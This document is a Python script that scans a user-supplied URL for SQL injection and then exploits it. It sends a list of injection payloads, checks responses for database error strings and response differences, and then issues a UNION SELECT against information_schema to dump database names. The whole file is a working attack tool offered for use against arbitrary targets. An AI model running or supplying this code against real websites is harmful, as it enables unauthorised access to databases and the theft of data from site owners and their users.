import requests
from urllib.parse import quote

# Common SQL injection payloads for detection
payloads = [
    "' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "' OR 1=1--",
    "' OR '1'='1'",
    '" OR "1"="1"',
    "' OR 1=1#",
    "' OR ''='",
]

# SQL error messages to detect vulnerability
sql_errors = [
    "You have an error in your SQL syntax;",
    "Warning: mysql_fetch_assoc()",
    "Warning: mysql_fetch_array()",
    "Warning: pg_fetch_result()",
    "Unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "SQLSTATE[HY000]",
    "ORA-00933: SQL command not properly ended",
]

def is_vulnerable(url):
    print(f"[*] Testing {url} for SQL Injection vulnerabilities...")

    try:
        # Send normal request to compare responses
        normal_response = requests.get(url, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"[Error] Normal request failed: {e}")
        return False

    for payload in payloads:
        # Encode the payload to handle special characters
        target_url = f"{url}{quote(payload)}"
        try:
            response = requests.get(target_url, timeout=5)

            # Check for SQL error messages
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"[!!] Error-based SQL Injection detected with payload: {payload}")
                    return True

            # Boolean-based check: compare normal and payload responses
            if normal_response.text != response.text:
                print(f"[!!] Boolean-based SQL Injection detected with payload: {payload}")
                return True

        except requests.exceptions.RequestException as e:
            print(f"[Error] Request failed: {e}")

    print("[OK] No vulnerabilities detected.\n")
    return False

def exploit_sql_injection(url):
    # UNION-based SQLi to extract database names (MySQL example)
    union_payload = "' UNION SELECT NULL, schema_name FROM information_schema.schemata--"
    target_url = f"{url}{quote(union_payload)}"
    print("[*] Attempting to extract database names...")

    try:
        response = requests.get(target_url, timeout=5)
        if response.status_code == 200:
            print("[*] Response received. Checking for database names...\n")
            if "information_schema" in response.text.lower():
                print("[!!] Database names found in response:")
                print(response.text)
            else:
                print("[X] Exploit attempt did not return expected data.")
        else:
            print(f"[X] Unexpected response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[Error] Exploit request failed: {e}")

if __name__ == "__main__":
    target = input("Enter the target URL (e.g., http://example.com/page.php?id=): ")

    if is_vulnerable(target):
        exploit = input("Vulnerability detected! Attempt exploitation? (y/n): ")
        if exploit.lower() == 'y':
            exploit_sql_injection(target)
        else:
            print("Exploitation skipped.")
    else:
        print("No SQL Injection vulnerability found.")
